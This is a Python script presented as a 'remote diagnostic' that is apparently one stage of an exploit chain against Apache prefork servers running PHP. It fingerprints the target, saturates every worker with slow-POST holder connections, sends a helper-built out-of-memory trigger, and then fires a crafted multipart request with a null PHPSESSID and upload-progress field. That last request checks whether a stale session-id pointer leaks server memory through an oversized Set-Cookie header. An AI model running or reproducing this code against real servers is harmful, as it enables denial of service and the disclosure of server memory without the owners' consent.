#!/usr/bin/env python3
"""Remote diagnostic: probe a target without needing error log access.

Determines MaxRequestWorkers, whether A1 triggers OOM, whether the
worker survives, and whether the stale PS(id) is readable.

usage:
  python3 diag_remote.py --host 192.168.155.10 --port 80
"""
from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
PURE = os.path.join(HERE, "pure")
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def quick_get(host: str, port: int, timeout: float = 10.0) -> bytes:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(("GET /index.php HTTP/1.0\r\nHost: %s\r\n\r\n" % host).encode())
    resp = bytearray()
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp.extend(chunk)
    except OSError:
        pass
    s.close()
    return bytes(resp)


def hold_one(host: str, port: int, timeout: float = 5.0):
    s = socket.create_connection((host, port), timeout=timeout)
    # send 50KB of body data upfront; with reqtimeout minrate=500,
    # this extends the deadline by 50000/500 = 100 seconds
    s.sendall(("POST /index.php HTTP/1.1\r\nHost: %s\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
               "Content-Length: 1048576\r\n\r\n" % host).encode() + b"x" * 50000)
    return s


def probe_session(host: str, port: int, timeout: float = 15.0) -> bytes:
    """Send a minimal multipart POST with PHPSESSID + file +
    PHP_SESSION_UPLOAD_PROGRESS to trigger session_start via the upload
    progress mechanism and read back the (potentially stale) PS(id)."""
    boundary = b"CCCCCCCCCC"
    body = (b"--" + boundary + b"\r\n"
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            b"\x00\r\n"
            b"--" + boundary + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="a"\r\n'
            b"Content-Type: application/octet-stream\r\n\r\n\r\n"
            b"--" + boundary + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b"x\r\n"
            b"--" + boundary + b"--\r\n")
    req = ("POST /index.php HTTP/1.0\r\nHost: %s\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n"
           % (host, boundary.decode(), len(body))).encode() + body
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    resp = bytearray()
    try:
        s.sendall(req)
        while len(resp) < 8 << 20:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp.extend(chunk)
    except OSError:
        pass
    s.close()
    return bytes(resp)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--max-probe", type=int, default=300,
                    help="max workers to probe (default 300)")
    args = ap.parse_args()

    # ── Step 1: Server header ──────────────────────────────────
    print("[1/5] Probing server header...")
    try:
        resp = quick_get(args.host, args.port)
        for line in resp.split(b"\r\n"):
            low = line.lower()
            if low.startswith(b"server:") or low.startswith(b"x-powered-by:"):
                print("      %s" % line.decode("latin1", "replace"))
    except Exception as exc:
        print("      connection failed: %r" % exc)
        return 1

    # ── Step 2: Count MaxRequestWorkers ────────────────────────
    print("[2/5] Counting MaxRequestWorkers (up to %d)..." % args.max_probe)
    holders = []

    def is_saturated(timeout: float = 3.0) -> bool:
        """Check if ALL workers are busy by seeing if a GET hangs."""
        s = None
        try:
            s = socket.create_connection((args.host, args.port), timeout=timeout)
            s.settimeout(timeout)
            s.sendall(("GET /index.php HTTP/1.0\r\nHost: %s\r\n\r\n"
                        % args.host).encode())
            data = s.recv(1)
            s.close()
            return False  # got data — not saturated
        except socket.timeout:
            if s:
                s.close()
            return True   # timed out waiting for response — saturated
        except OSError:
            if s:
                try:
                    s.close()
                except OSError:
                    pass
            return True   # connection refused / reset — also saturated

    # add holders in batches; after each batch, test saturation.
    # Apache prefork spawns workers gradually (1,2,4,8,...), so after
    # a transient saturation we wait for it to ramp up and continue.
    batch_size = 20
    saturated = False
    while len(holders) < args.max_probe:
        for _ in range(min(batch_size, args.max_probe - len(holders))):
            try:
                s = hold_one(args.host, args.port)
                holders.append(s)
            except OSError:
                break
            time.sleep(0.005)
        print("      %d holders connected, testing..." % len(holders))
        time.sleep(0.3)
        if not is_saturated(timeout=2.0):
            continue
        # hit saturation — but Apache may still be spawning workers
        # wait and recheck up to 3 times (Apache spawns every ~1s)
        stable = True
        for retry in range(3):
            time.sleep(2.0)
            if not is_saturated(timeout=2.0):
                print("      Apache spawned more workers, continuing...")
                stable = False
                break
        if stable:
            saturated = True
            print("      saturated at %d holders (MaxRequestWorkers ~ %d)" % (
                len(holders), len(holders) + 1))
            break

    if not saturated:
        time.sleep(0.5)
        if is_saturated(timeout=2.0):
            saturated = True
            print("      saturated at %d holders (MaxRequestWorkers ~ %d)" % (
                len(holders), len(holders) + 1))
        else:
            print("      %d holders but server still responds — not saturated" % len(holders))
            if len(holders) >= args.max_probe - 1:
                print("      MaxRequestWorkers > %d (increase --max-probe)" % args.max_probe)
            else:
                print("      possibly event/worker MPM (not prefork)")

    if not saturated:
        for s in holders:
            try:
                s.close()
            except OSError:
                pass
        print("\n[!] Cannot saturate workers — exploit requires prefork MPM")
        return 1

    # release holders until a worker is actually free
    print("[3/5] Freeing a worker and checking response...")
    worker_free = False
    released = 0
    while holders and not worker_free:
        # release a batch of early holders (most likely to hold real workers)
        batch = min(5, len(holders))
        for _ in range(batch):
            holders.pop(0).close()
            released += 1
        time.sleep(1.0)
        try:
            resp = quick_get(args.host, args.port, timeout=5.0)
            if len(resp) > 0:
                worker_free = True
                status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
                cookie_len = 0
                for line in resp.split(b"\r\n"):
                    if line.lower().startswith(b"set-cookie: phpsessid="):
                        cookie_len = len(line)
                print("      released %d holders, worker responds: %s" % (
                    released, status))
        except Exception:
            pass
    if not worker_free:
        print("      released all %d holders but no worker responded" % released)
        print("\n[!] Cannot free a worker — server may not be prefork")
        return 1

    # ── Step 4: Fire A1 and check if worker survives ──────────
    print("[4/5] Sending A1 (OOM trigger)...")
    tmp = tempfile.mkdtemp(prefix="p2s-diag-")
    a1 = os.path.join(tmp, "a.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
                    "--out", a1, "--big", "78"], check=True,
                   stdout=subprocess.DEVNULL)
    try:
        subprocess.run([sys.executable, os.path.join(PURE, "chunked_send.py"),
                        "--host", args.host, "--port", str(args.port),
                        "--body-file", a1, "--path", "/index.php" + Q,
                        "--timeout", "180",
                        "--save-response", os.path.join(tmp, "a1.resp")],
                       check=True, timeout=200)
        a1_resp = open(os.path.join(tmp, "a1.resp"), "rb").read()
        print("      A1 response: %d bytes" % len(a1_resp))
        if a1_resp:
            status = a1_resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
            print("      status: %s" % status)
    except subprocess.TimeoutExpired:
        print("      A1 timed out (180s) — body may not have delivered")
        a1_resp = b""
    except subprocess.CalledProcessError as exc:
        print("      A1 send failed: %r" % exc)
        a1_resp = b""

    time.sleep(2.0)

    # check if the worker is still alive and if the stale pointer is readable
    print("[5/5] Probing worker after A1 (session trigger)...")
    try:
        resp = probe_session(args.host, args.port, timeout=15.0)
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        cookie_line = b""
        for line in resp.split(b"\r\n"):
            if line.lower().startswith(b"set-cookie: phpsessid="):
                cookie_line = line
        cookie_len = len(cookie_line)

        print("      worker alive: %s" % status)
        print("      Set-Cookie length: %d bytes" % cookie_len)

        if cookie_len > 10000:
            print("      STALE POINTER DETECTED — oversized Set-Cookie (%d bytes)" % cookie_len)
            print("        exploit should work: B1 leak will read stale memory")
            val = cookie_line[len(b"Set-Cookie: PHPSESSID="):].split(b";")[0]
            dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
            print("        decoded session id: %d bytes" % len(dec))
        elif cookie_len > 0:
            val = cookie_line[len(b"Set-Cookie: PHPSESSID="):].split(b";")[0]
            print("      session id: %s" % val.decode("latin1", "replace")[:80])
            print("      worker survived A1 — B1 should get a response (not 0 bytes)")
            print("      (oversized Set-Cookie only appears with B1's flood-fill body)")
        else:
            print("      no Set-Cookie — session not triggered")
            print("      check: is session.upload_progress.enabled = On?")
    except Exception as exc:
        print("      worker NOT responding after A1: %r" % exc)
        print("      the worker likely crashed (segfault, not just OOM bailout)")
        print("      B1 will always get 0 bytes — the stale pointer is lost")

    # cleanup
    for s in holders:
        try:
            s.close()
        except OSError:
            pass
    print("\n[*] Done. Holders released.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
